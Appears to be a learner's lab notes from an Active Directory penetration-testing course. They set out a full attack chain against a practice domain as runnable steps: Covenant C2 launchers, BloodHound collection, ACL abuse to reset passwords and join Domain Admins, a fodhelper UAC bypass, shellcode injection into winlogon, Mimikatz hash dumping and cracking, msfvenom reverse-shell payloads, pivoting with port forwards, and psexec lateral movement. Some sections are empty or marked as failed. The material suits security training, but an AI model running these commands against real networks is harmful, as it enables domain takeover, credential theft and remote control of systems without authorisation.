### Disable Setting on Domain Controller To Allow Passing of Hashes
- On domain
	- `gpedit`
		- `Computer Configuration`
			- `Administrative Templates`
				- `System`
					- `Credentials Delegation`
						- `Restrict delegation of credentials to remote servers : Disabled`

### Brief Overview of the Domain Through BloodHound
- Open a grunt with `Covenant`
	- [[Covenant Quick Shell on Windows Host]]
```bash
- Open `Covenant`
	- Set up a listener in `Listeners` tab
		- Name: `HTTP Listener`
		- ConnectAddress: `your-ip-address`
		- `Create`
	- Set up a launcher in `Launchers`
		- `PowerShell`
			- Listener: `HTTP Listener`
			- DotNetVersion: `Net40`
				- For a short link: `Net35` **Net35 is manditory when using `msiexec` and fodhelper i.e. `helper.ps1`**
			- KillDate: `some date in future`
			- `Generate`
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20221125031343.png)
```
- Paste the generated payload into the Windows host `powershell.exe` window
```
- In `Grunt`:
	- `ChangeDirectory C:\Users\Public`
		- `Upload`
			- `sharphound.exe`
				- Ensure the version of `Sharphound` is the same as the bloodhound install
	- `shell sharphound.exe -c all`
![image](https://0xc0rvu5.github.io/docs/assets/images/20221127040208.png)
- `download 20221127035950_BloodHound.zip`
	- Make sure to **click** the download on `Covenant` to download 
![image](https://0xc0rvu5.github.io/docs/assets/images/20221127040452.png)
- If not installed
	- `apt install neo4j bloodhound`
- `neo4j console`
- Set up new `neo4j` *credentials*
	- http://localhost:7474/
![image](https://0xc0rvu5.github.io/docs/assets/images/20221127041033.png)
- Close the `neo4j` web browser window after changing the default password
- `bloodhound`
	- Drag and drop *.zip* file into `Bloodhound`
		- `20221127035950_BloodHound.zip`
- In `Bloodhound`
	- Go to the hamburger menu
		- Go to the bottom of the `Database Info` section
			- `Refresh Database Stats`
- Go to `Analysis` tab for guided information

### Abusing ACLs
- Open a grunt with `Covenant`
	- [[Covenant Quick Shell on Windows Host]]
```bash
- Open `Covenant`
	- Set up a listener in `Listeners` tab
		- Name: `HTTP Listener`
		- ConnectAddress: `your-ip-address`
		- `Create`
	- Set up a launcher in `Launchers`
		- `PowerShell`
			- Listener: `HTTP Listener`
			- DotNetVersion: `Net40`
				- For a short link: `Net35` **Net35 is manditory when using `msiexec` and fodhelper i.e. `helper.ps1`**
			- KillDate: `some date in future`
			- `Generate`
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20221125031343.png)
```
- Paste the generated payload into the Windows host `powershell.exe` window
```
- In `Grunt`:
	- `ChangeDirectory C:\Users\Public`
		- `Upload`
			- `powerview_dev.ps1`
- On Windows host
	- `cd C:\Users\Public`
		- Invoke `powerview_dev`
			- `. .\powerview_dev.ps1`
	- Download and execute `Sharphound`
		- Refer too:
			- [[Execute SharpHound on Windows Host With Covenant]]
```bash
- Open a grunt with `Covenant`
	- [[Covenant Quick Shell on Windows Host]]
- In `Grunt`:
	- `ChangeDirectory C:\Users\Public`
		- `Upload`
			- `sharphound.exe`
				- Ensure the version of `Sharphound` is the same as the bloodhound install
	- `shell sharphound.exe -c all`
```
![image](https://0xc0rvu5.github.io/docs/assets/images/20221127040208.png)
```
- `download 20221127035950_BloodHound.zip`
	- Make sure to **click** the download on `Covenant` to download 
```
	- Check user groups for `s.chisholm`
		- If `s.chisholm` is not yet in the *engineering* group
			- `net group engineering s.chisholm /add /domain`
	- Now add to `IT Admins` group
		- `net group "IT Admins" s.chisholm /add /domain`
- Go to Bloodhound:
	- `Analysis`
		- `Find Shortest Paths to Domain Admins` or `Shortest Path to High Value Targets`
			- Reference `GenericAll` help options
				- `Abuse Info`
- On Windows Host
	- `$SecPassword = ConvertTo-SecureString 'FallOutBoy1!' -AsPlainText -Force`
	- `$Cred = New-Object System.Management.Automation.PSCredential('mayorsec\s.chisholm', $SecPassword)`
	- `$UserPass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force`
	- `Set-DomainUserPassword -Identity j.taylor -AccountPassword $UserPass -Credential $Cred`
		- Note if this fails you need to configure all of the permissions to correlate to the video...
	- `Enter-PSSession -ComputerName dc01 -credential mayorsec\j.taylor`
	- `net group "Domain Admins" j.taylor /add /domain`

### Passing through Remote Desktop
- On `Covenant` obtain a `High` integrity shell
	- Refer too:
		- [[Fodhelper UAC Bypass with Covenant]]
```bash
- **High level privileges**
- Open `Coveneant`
- Start a shell on the Windows host
	- [[Covenant Quick Shell on Windows Host]]
- `powershellimport`
	- `helper.ps1`
- Ensure you using DotNetVersion: `Net35`
	- Copy the encoded payload
- `powershell helper -custom "cmd.exe /c enter_payload_here"`
- Elevate to: **System level privileges**
	- In `Covenant` run:
		- `ps`
		- Find `winlogon.exe` and identify the PID
		- Go to `Launchers`
			- `ShellCode`
				- DotNetVersion: `Net40`
				- `Generate`
				- `Download`
		- `inject`
			- Enter the `winlogon.exe` PID
			- Add the recently generated shellcode *.bin* file
		- `Execute`
```
- `Mimikatz token::elevate lsadump::sam`
- Copy `j.taylor` hashes
![image](https://0xc0rvu5.github.io/docs/assets/images/20221127092647.png)
- Add hashes on desktop
	- `tocrack.txt`
	- `wget https://raw.githubusercontent.com/dievus/ADGenerator/main/coursewordlist `
- `john tocrack.txt --format=nt --wordlist=coursewordlist`
- On Windows *Workstation-01*
	- Search:
		- `Remote Desktop Connection`
			- Computer: `workstation-02`
			- User name: `mayorsec\j.taylor`
	- On Windows *Workstation-02*
		- Search:
			- `Remote Desktop Connection`
				- Computer:  `dc01`
				- User name: `mayorsec\j.taylor`
- **Full system domain control by the means of RDP**

### Configuring Reverse Port Forwarding
- On `Covenant` obtain a `High` integrity shell
	- Refer too:
		- [[Fodhelper UAC Bypass with Covenant]]
```bash
- **High level privileges**
- Open `Coveneant`
- Start a shell on the Windows host
	- [[Covenant Quick Shell on Windows Host]]
- `powershellimport`
	- `helper.ps1`
- Ensure you using DotNetVersion: `Net35`
	- Copy the encoded payload
- `powershell helper -custom "cmd.exe /c enter_payload_here"`
- Elevate to: **System level privileges**
	- In `Covenant` run:
		- `ps`
		- Find `winlogon.exe` and identify the PID
		- Go to `Launchers`
			- `ShellCode`
				- DotNetVersion: `Net40`
				- `Generate`
				- `Download`
		- `inject`
			- Enter the `winlogon.exe` PID
			- Add the recently generated shellcode *.bin* file
		- `Execute`
```
- In a shell:
	- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=25 -f raw -o /root/Desktop/msf.bin`
	- `msfconsole`
		-  `use exploit/multi/handler`
		- `set payload windows/x64/meterpreter/reverse_tcp`
		- `set lport 25`
		- `set lhost eth0`
		- `exploit -j`
- On `Covenant` in a `High` integrity shell
	- `ps`
		- Find *PID* with a **Sessio0nID** greater than 0
		- `Winlogon` has a *PID* of `612`
	- `inject 612`
		- Attach the created `msfvenom` shellcode
- Back on `Metasploit`
	- `sessions -i 1`
	- `ipconfig`
	- `run autoroute -s 10.120.116.10/24`
	- Verify route is setup:
		- `run autoroute -p`
	- Port forward to access internal network devices that were not accessible before
		- `portfwd add -R -p 2222 -l 443 -L 192.168.3.28`
	- Verify:
		- `portfwd`
	- `CTRL-z`
	- `use auxiliary/server/socks4a`
- `mousepad /etc/proxychains4.conf`
	- Go to bottom of file and verify the port being used
		- `9050`
- Back on `Metasploit`
	- `set srvport 9050`
	- `exploit -j`
	- Back on `Coveneant`
		- Go to `Listeners`
			- Create a new listener
				- Name: `Reverse HTTP`
				- BindPort: `443`
				- ConnectPort: `2222`
				- ConnectAddress: `10.120.116.10`
![image](https://0xc0rvu5.github.io/docs/assets/images/20221125163634.png)
- Go to `Launchers`
	- Listeners: `Reverse HTTP`
	- DotNetVersion: `Net40`
	- `Generate`
	- Go to `Hosts` tab
		- Url: `/test.ps1`
	- `Host`
	- Copy `EncodedLauncher`
- **Follow the next section to gain system level access**

### Gaining a Shell on an Internal Workstation
- In `Metasploit`
	- `use exploit/windows/smb/psexec`
	- `set rhosts 10.120.116.10`
	- `set smbdomain mayorsec`
	- `set smbpass Password123!`
	- `set smbuser j.taylor`
	- `set payload windows/x64/exec `
	- `set cmd copied_payload_here`
	- `eploit -j`
- A  **system** integrity level shell should be received on `Covenant`

### Remoting Through Proxychains
- Workstation-01
	- `proxychains xfreerdp /u:j.taylor /p:'Password123!' /v:192.168.3.4 /d:mayorsec`
- Why can't I achieve this through workstation-02????

### Unconstrained Delegation

### Golden Ticket Persistence

### Reverse Port Forwarding for Shell on DC01
- **Step by step follow for this instance and still failure. The only deviations were to meet the corresponding dynamic IPs on my system. 2 Covenant system level integrity shells both Workstation-01**
- Open a grunt with `Covenant`
	- [[Covenant Quick Shell on Windows Host]]
```bash
- Open `Covenant`
	- Set up a listener in `Listeners` tab
		- Name: `HTTP Listener`
		- ConnectAddress: `your-ip-address`
		- `Create`
	- Set up a launcher in `Launchers`
		- `PowerShell`
			- Listener: `HTTP Listener`
			- DotNetVersion: `Net40`
				- For a short link: `Net35` **Net35 is manditory when using `msiexec` and fodhelper i.e. `helper.ps1`**
			- KillDate: `some date in future`
			- `Generate`
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20221125031343.png)
```
- Paste the generated payload into the Windows host `powershell.exe` window
```
- On Kali:
	- `msfconsole`
		- `search web_delivery`
		- `use 1`
		- `set target 2` **this sets up a powershell.exe shell**
		- `set payload windows/x64/meterpreter/reverse_http`
		- `set lhost eth0`
		- `set lport 25`
		- `exploit -j`
		- Copy payload
	- Within the `Covenant` grunt session
		- `powershell copied_payload_here`
	- Back on `Metasploit`
		- `sessions -i 1`
		- `ipconfig`
		- `run autoroute -s 192.168.16.0/24`
		- `run autoroute -s 10.120.116.0/24`
		- Verify route is setup:
			- `run autoroute -p`
		- Port forward to access internal network devices that were not accessible before
			- `portfwd add -R -p 2222 -l 443 -L 192.168.3.28`
			- `portfwd add -R -p 2223 -l 8082 -L 192.168.3.28`
			- `CTRL+z`
- On `Covenant`
	- Create `EncodedPayload` for:
		- `Listeners`
			- `HTTP Listener`
			- `Reverse HTTP`
				- `192.168.16.4`
			- `reverse Listener2`
				- `10.120.116.20`
- On `Metasploit`
	- `use windows/smb/psexec`
	- `smbdomain mayorsec`
	- `smbuser themayor`
	- `smbpass Password123!`
	- `set payload windows/x64/exec`
	- `set rhost 192.168.16.4`
	- `set cmd reverse_EncodedLauncher_for_16.4`
	- `exploit`
	- `set rhost 10.120.116.10`
	- `set cmd reverse_EncodedLaundher_for_116.10`
	- `exploit`
- **Step by step follow for this instance and still failure. The only deviations were to meet the corresponding dynamic IPs on my system. 2 Covenant system level integrity shells both Workstation-01**

#hacking
